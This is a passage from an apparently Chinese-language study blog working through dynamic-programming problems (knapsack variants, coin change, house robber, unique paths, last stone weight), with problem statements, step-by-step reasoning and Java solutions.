</blockquote>
</li>
</ol>
<p>解法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numTrees</span><span class="params">(<span class="type">int</span> n)</span> &#123; </span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++)&#123;</span><br><span class="line">            dp[i] += dp[j-<span class="number">1</span>]*dp[i-j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

























<h2 id="其他例题"><a href="#其他例题" class="headerlink" title="其他例题"></a>其他例题</h2><h3 id="01背包-474-一和零"><a href="#01背包-474-一和零" class="headerlink" title="[01背包] 474. 一和零"></a>[01背包] <a href="https://leetcode.cn/problems/ones-and-zeroes/">474. 一和零</a></h3><p><strong>【题目】</strong></p>
<p>给你一个二进制字符串数组 <code>strs</code> 和两个整数 <code>m</code> 和 <code>n</code> 。请你找出并返回 <code>strs</code> 的最大子集的长度，该子集中 <strong>最多</strong> 有 <code>m</code> 个 <code>0</code> 和 <code>n</code> 个 <code>1</code> 。如果 <code>x</code> 的所有元素也是 <code>y</code> 的元素，集合 <code>x</code> 是集合 <code>y</code> 的 <strong>子集</strong></p>
<p><strong>【示例】</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：strs = [&quot;10&quot;, &quot;0001&quot;, &quot;111001&quot;, &quot;1&quot;, &quot;0&quot;], m = 5, n = 3</span><br><span class="line">输出：4</span><br><span class="line">解释：最多有 5 个 0 和 3 个 1 的最大子集是 &#123;&quot;10&quot;,&quot;0001&quot;,&quot;1&quot;,&quot;0&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>【思路】</strong></p>
<ol>
<li><p>确定dp数组（dp table）以及下标的含义</p>
<blockquote>
<p> dp[i][j]：最多有i个0和j个1的strs的最大子集的大小为dp[i][j]。</p>
</blockquote>
</li>
<li><p>确定递推公式（状态转移公式）<code>递推公式决定了dp数组要如何初始化！</code></p>
<blockquote>
<p>dp[i][j] 就可以是 dp[i - zeroCount][j - oneCount] + 1。</p>
</blockquote>
</li>
<li><p>dp数组如何初始化</p>
<blockquote>
<p>不需要</p>
</blockquote>
</li>
<li><p>确定遍历顺序</p>
<blockquote>
<p>需要从i&#x3D;m,j&#x3D;n开始往i &#x3D; zeroCount  j &#x3D; oneCount回溯，避免同一轮遍历时影响后序的。</p>
</blockquote>
</li>
</ol>
<p><strong>【题解】</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findMaxForm</span><span class="params">(String[] strs, <span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (String str : strs) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : str.toCharArray()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                m1++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n1</span> <span class="operator">=</span> str.length() - m1;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> m; j &gt;= m1; j--) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> n; k &gt;= n1; k--) &#123;</span><br><span class="line">                dp[j][k] = Math.max(dp[j][k], dp[j - m1][k - n1] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m][n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="01背包-416-分割等和子集"><a href="#01背包-416-分割等和子集" class="headerlink" title="[01背包] 416. 分割等和子集"></a>[01背包] <a href="https://leetcode.cn/problems/partition-equal-subset-sum/">416. 分割等和子集</a></h3><p>给你一个 <strong>只包含正整数</strong> 的 <strong>非空</strong> 数组 <code>nums</code> 。请你判断是否可以将这个数组分割成两个子集，使得两个子集的元素和相等。</p>
<p>类似背包问题，物品的体积和价值即为数字，背包容量即为总和的一半</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canPartition</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> num : nums) &#123;</span><br><span class="line">        sum += num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//总和为奇数，不能平分</span></span><br><span class="line">    <span class="keyword">if</span>(sum % <span class="number">2</span> != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> sum / <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[target + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> target; j &gt;= nums[i]; j--) &#123;</span><br><span class="line">            <span class="comment">//物品 i 的重量是 nums[i]，其价值也是 nums[i]</span></span><br><span class="line">            dp[j] = Math.max(dp[j], dp[j - nums[i]] + nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(dp[target] == target)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[target] == target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="完全背包-组合-518-零钱兑换-II"><a href="#完全背包-组合-518-零钱兑换-II" class="headerlink" title="[完全背包 - 组合] 518. 零钱兑换 II"></a>[完全背包 - 组合] <a href="https://leetcode.cn/problems/coin-change-ii/">518. 零钱兑换 II</a></h3><p>【<strong>题目</strong>】</p>
<p>给你一个整数数组 <code>coins</code> 表示不同面额的硬币，另给一个整数 <code>amount</code> 表示总金额。请你计算并返回可以凑成总金额的硬币组合数。如果任何硬币组合都无法凑出总金额，返回 <code>0</code> 。假设每一种面额的硬币有无限个。 题目数据保证结果符合 32 位带符号整数。</p>
<p>【<strong>思路</strong>】</p>
<ol>
<li>确定dp数组（dp table）以及下标的含义</li>
</ol>
<blockquote>
<p>dp[j]表示前i个面额的硬币凑成 j 金额最多有dp[j]种可能。</p>
</blockquote>
<ol start="2">
<li>确定递推公式（状态转移公式）<code>递推公式决定了dp数组要如何初始化！</code></li>
</ol>
<blockquote>
<p>当考虑到第i个面额的硬币时，前i-1种面额硬币已经可以有dp[j]种组合，再加上当前面额的硬币参与的组合（dp[j-coins[i]]），即当前dp[j]的值。</p>
<p><strong>只要是装满背包有几种可能，就一定是dp[j] +&#x3D; dp[j-weight[i]]</strong></p>
</blockquote>
<ol start="3">
<li>dp数组如何初始化</li>
</ol>
<blockquote>
<p>dp[0]必须为1才可以使用递推。</p>
</blockquote>
<ol start="4">
<li>确定遍历顺序</li>
</ol>
<blockquote>
<p>必须先遍历面额再遍历背包容量<br>假如先遍历面额再遍历背包容量：</p>
<p>​	若coins[0] &#x3D; 1，coins[1] &#x3D; 5。</p>
<p>​	那么就是先把1加入计算，然后再把5加入计算，得到的方法数量只有{1, 5}这种情况。而不会出现{5, 1}的情况。</p>
<p>假如先遍历背包容量再遍历面额：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; coins.size(); i++) &#123; <span class="comment">// 遍历物品</span></span><br><span class="line">        <span class="keyword">if</span> (j - coins[i] &gt;= <span class="number">0</span>) dp[j] += dp[j - coins[i]];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​	那么背包容量的每一个值，都是经过 1 和 5 的计算，包含了{1, 5} 和 {5, 1}两种情况。<strong>此时dp[j]里算出来的就是排列数！</strong></p>
</blockquote>
<h3 id="完全背包-排列-377-组合总和-Ⅳ"><a href="#完全背包-排列-377-组合总和-Ⅳ" class="headerlink" title="[完全背包 - 排列] 377. 组合总和 Ⅳ"></a>[完全背包 - 排列] <a href="https://leetcode.cn/problems/combination-sum-iv/">377. 组合总和 Ⅳ</a></h3><p>【<strong>题目</strong>】</p>
<p>给你一个由 <strong>不同</strong> 整数组成的数组 <code>nums</code> ，和一个目标整数 <code>target</code> 。请你从 <code>nums</code> 中找出并返回总和为 <code>target</code> 的元素组合的个数。题目数据保证答案符合 32 位整数范围。</p>
<p>【<strong>示例</strong>】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,3], target = 4</span><br><span class="line">输出：7</span><br><span class="line">解释：</span><br><span class="line">所有可能的组合为：</span><br><span class="line">(1, 1, 1, 1)</span><br><span class="line">(1, 1, 2)</span><br><span class="line">(1, 2, 1)</span><br><span class="line">(1, 3)</span><br><span class="line">(2, 1, 1)</span><br><span class="line">(2, 2)</span><br><span class="line">(3, 1)</span><br></pre></td></tr></table></figure>

<p>【思路】</p>
<p>​	即与上一题不同的组合问题。</p>
<p>【题解】</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">combinationSum4</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[target + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt;= target; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j - nums[i] &gt;= <span class="number">0</span>)</span><br><span class="line">                dp[j] += dp[j - nums[i]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[target];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>【类似题目】</p>
<p><a href="https://kamacoder.com/problempage.php?pid=1067">爬楼梯II</a></p>
<p><a href="https://leetcode.cn/problems/word-break/">139. 单词拆分</a></p>
<h3 id="完全背包-其他-322-零钱兑换"><a href="#完全背包-其他-322-零钱兑换" class="headerlink" title="[完全背包 - 其他] 322. 零钱兑换"></a>[完全背包 - 其他] <a href="https://leetcode.cn/problems/coin-change/">322. 零钱兑换</a></h3><p>【<strong>题目</strong>】</p>
<p>给你一个整数数组 <code>coins</code> ，表示不同面额的硬币；以及一个整数 <code>amount</code> ，表示总金额。计算并返回可以凑成总金额所需的 <strong>最少的硬币个数</strong> 。如果没有任何一种硬币组合能组成总金额，返回 <code>-1</code> 。你可以认为每种硬币的数量是无限的。</p>
<p>【<strong>思路</strong>】</p>
<ol>
<li>确定dp数组（dp table）以及下标的含义</li>
</ol>
<blockquote>
<p>dp[j]表示最少需要dp[j]个硬币才能凑成 j 金额。</p>
</blockquote>
<ol start="2">
<li>确定递推公式（状态转移公式）<code>递推公式决定了dp数组要如何初始化！</code></li>
</ol>
<blockquote>
<p>显然：dp[j] &#x3D; Math.min(dp[j], dp[j - coins[i]] + 1);</p>
</blockquote>
<ol start="3">
<li>dp数组如何初始化</li>
</ol>
<blockquote>
<p>dp[0]初始为0，同时为使得min发挥作用，其他需要初始化为Integer.MAX_VALUE</p>
<p>需要注意的是，如果 dp[j - coins[i]]为初始值，说明无法凑出 <code>j-coins[i]</code>金额，此时就不存在可以dp[j - coins[i]] + 1了</p>
</blockquote>
<ol start="4">
<li>确定遍历顺序</li>
</ol>
<blockquote>
<p>最少硬币，无论是组合还是排列都可以找到，所以顺序无所谓。</p>
</blockquote>
<p>【<strong>题解</strong>】</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">coinChange</span><span class="params">(<span class="type">int</span>[] coins, <span class="type">int</span> amount)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[amount + <span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= amount; i++) &#123;</span><br><span class="line">        dp[i] = max;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; coins.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> coins[i]; j &lt;= amount; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dp[j - coins[i]] != max) &#123;</span><br><span class="line">                dp[j] = Math.min(dp[j], dp[j - coins[i]] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[amount] == max ? -<span class="number">1</span> : dp[amount];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>【类似题目】</p>
<p><a href="https://leetcode.cn/problems/perfect-squares/">279. 完全平方数</a></p>
<h3 id="198-打家劫舍"><a href="#198-打家劫舍" class="headerlink" title="198 打家劫舍"></a>198 打家劫舍</h3><p>你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警。</p>
<p>给定一个代表每个房屋存放金额的非负整数数组，计算你 不触动警报装置的情况下 ，一夜之内能够偷窃到的最高金额。</p>
<p><strong>思路</strong><br>对于第 k (k&gt;2) 间房屋，有两个选项：</p>
<ol>
<li>偷窃第 k 间房屋，那么就不能偷窃第 k−1 间房屋，偷窃总金额为前 k−2 间房屋的最高总金额与第 k 间房屋的金额之和。</li>
<li>不偷窃第 k 间房屋，偷窃总金额为前 k−1 间房屋的最高总金额。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rob</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">     <span class="keyword">if</span> (len == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">    dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">    dp[<span class="number">1</span>] = Math.max(nums[<span class="number">1</span>],nums[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt; len; i++) &#123;</span><br><span class="line">        dp[i] = Math.max(dp[i-<span class="number">2</span>]+nums[i],dp[i-<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[len-<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="成环问题-213-打家劫舍-II"><a href="#成环问题-213-打家劫舍-II" class="headerlink" title="[成环问题]213. 打家劫舍 II"></a>[成环问题]<a href="https://leetcode.cn/problems/house-robber-ii/">213. 打家劫舍 II</a></h3><p>你是一个专业的小偷，计划偷窃沿街的房屋，每间房内都藏有一定的现金。这个地方所有的房屋都 围成一圈 ，这意味着第一个房屋和最后一个房屋是紧挨着的。同时，相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警 。</p>
<p>给定一个代表每个房屋存放金额的非负整数数组，计算你 在不触动警报装置的情况下 ，能够偷窃到的最高金额</p>
<p>【思路】</p>
<p>环形问题应当尝试转化为线性问题</p>
<p>在题目情况下，我们可以有三种选择：</p>
<ol>
<li><p>选择首元素而不选择尾元素</p>
<blockquote>
<p>在此情况下相当于考虑没有尾元素之后的打家劫舍I问题</p>
</blockquote>
</li>
<li><p>选择尾元素而不选择首元素</p>
<blockquote>
<p>在此情况下相当于考虑没有首元素之后的打家劫舍I问题</p>
</blockquote>
</li>
<li><p>首尾元素均不选择</p>
<blockquote>
<p>在此情况下相当于考虑没有首尾元素后的打家劫舍I问题</p>
</blockquote>
</li>
</ol>
<p>情况1，2 覆盖了3</p>
<p>【题解】</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rob</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">if</span> (len == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.max(robAction(nums, <span class="number">0</span>, len - <span class="number">1</span>), robAction(nums, <span class="number">1</span>, len));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">robAction</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>, y = <span class="number">0</span>, z = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start; i &lt; end; i++) &#123;</span><br><span class="line">            y = z;</span><br><span class="line">            z = Math.max(y, x + nums[i]);</span><br><span class="line">            x = y;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> z;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="337-打家劫舍-III"><a href="#337-打家劫舍-III" class="headerlink" title="337. 打家劫舍 III"></a><a href="https://leetcode.cn/problems/house-robber-iii/">337. 打家劫舍 III</a></h3><p>在上次打劫完一条街道之后和一圈房屋后，小偷又发现了一个新的可行窃的地区。这个地区只有一个入口，我们称之为“根”。  除了“根”之外，每栋房子有且只有一个“父“房子与之相连。一番侦察之后，聪明的小偷意识到“这个地方的所有房屋的排列类似于一棵二叉树”。  如果两个直接相连的房子在同一天晚上被打劫，房屋将自动报警。</p>
<p>计算在不触动警报的情况下，小偷一晚能够盗取的最高金额。</p>
<h3 id="63-不同路径II"><a href="#63-不同路径II" class="headerlink" title="63 不同路径II"></a>63 不同路径II</h3><p>给定一个 m x n 的整数数组 grid。一个机器人初始位于 左上角（即 grid[0][0]）。机器人尝试移动到 右下角（即 grid[m - 1][n - 1]）。机器人每次只能向下或者向右移动一步。<br>网格中的障碍物和空位置分别用 1 和 0 来表示。机器人的移动路径中不能包含 任何 有障碍物的方格。<br>返回机器人能够到达右下角的不同路径数量。<br>测试用例保证答案小于等于 2 * 109。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">uniquePathsWithObstacles</span><span class="params">(<span class="type">int</span>[][] obstacleGrid)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (obstacleGrid.length == <span class="number">0</span> || obstacleGrid[<span class="number">0</span>].length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> obstacleGrid.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> obstacleGrid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="comment">// System.out.println(&quot;m&quot;+m+&quot; n&quot;+n);</span></span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m][n];</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (obstacleGrid[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                dp[i][j] = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">0</span> &amp;&amp; j == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">up</span> <span class="operator">=</span> <span class="number">0</span>, left = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (i - <span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    up = dp[i - <span class="number">1</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (j - <span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    left = dp[i][j - <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                dp[i][j] = up + left;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1049-最后一块石头的重量-II"><a href="#1049-最后一块石头的重量-II" class="headerlink" title="1049. 最后一块石头的重量 II"></a><a href="https://leetcode.cn/problems/last-stone-weight-ii/">1049. 最后一块石头的重量 II</a></h3><p>有一堆石头，用整数数组 <code>stones</code> 表示。其中 <code>stones[i]</code> 表示第 <code>i</code> 块石头的重量。</p>
<p>每一回合，从中选出<strong>任意两块石头</strong>，然后将它们一起粉碎。假设石头的重量分别为 <code>x</code> 和 <code>y</code>，且 <code>x &lt;= y</code>。那么粉碎的可能结果如下：</p>
<ul>
<li>如果 <code>x == y</code>，那么两块石头都会被完全粉碎；</li>
<li>如果 <code>x != y</code>，那么重量为 <code>x</code> 的石头将会完全粉碎，而重量为 <code>y</code> 的石头新重量为 <code>y-x</code>。</li>
</ul>
<p>最后，<strong>最多只会剩下一块</strong> 石头。返回此石头 <strong>最小的可能重量</strong> 。如果没有石头剩下，就返回 <code>0</code>。</p>
<p><strong>思路：</strong></p>
<p>分隔子集问题变种，实际就是将石头重量分成差距尽可能小的两个子集。</p>
<p><strong>题解</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lastStoneWeightII</span><span class="params">(<span class="type">int</span>[] stones)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : stones) &#123;</span><br><span class="line">            sum += i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> sum &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//初始化dp数组</span></span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[target + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; stones.length; i++) &#123;</span><br><span class="line">            <span class="comment">//采用倒序</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> target; j &gt;= stones[i]; j--) &#123;</span><br><span class="line">                <span class="comment">//两种情况，要么放，要么不放</span></span><br><span class="line">                dp[j] = Math.max(dp[j], dp[j - stones[i]] + stones[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum - <span class="number">2</span> * dp[target];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="非递减子序列个数"><a href="#非递减子序列个数" class="headerlink" title="非递减子序列个数"></a>非递减子序列个数</h3><p>给你一个数组，求其中非递减子序列个数，要求每个序列至少有两个元素</p>
<p>【示例】</p>
<p>输入：{4，5，7}</p>
<p>输出：4</p>
<p>解释：[[4,5],[5,7],[4,7],[,4,5,7]]</p>
<p>输入：{4，5，7,7}</p>
<p>输出：8</p>
<p>解释：[[4,5],[4,6],[4,7],[,4,5,7],[4,7,7],[5,7,7],[4,5,7,7],[7,7]]</p>
<p>【思路】</p>
<ol>
<li>确定dp数组（dp table）以及下标的含义</li>
</ol>
<blockquote>
<p>dp[i]表示前i数字可以凑成有dp[i]个序列。</p>
</blockquote>
<ol start="2">
<li>确定递推公式（状态转移公式）<code>递推公式决定了dp数组要如何初始化！</code></li>
</ol>
<blockquote>
</blockquote>
<ol start="3">
<li>dp数组如何初始化</li>
</ol>
<blockquote>
<p>dp[0]必须为1才可以使用递推。</p>
</blockquote>
<ol start="4">
<li>确定遍历顺序</li>
</ol>
<p>【题解】</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr==<span class="literal">null</span>||arr.length&lt;<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> arr.length;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            dp[i]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[i]&gt;arr[j])&#123;</span><br><span class="line">                    dp[i]+=dp[j]+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(arr[i]==arr[j])&#123;</span><br><span class="line">                    dp[i]=dp[j]+<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">total</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:dp)&#123;</span><br><span class="line">            total+=num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span 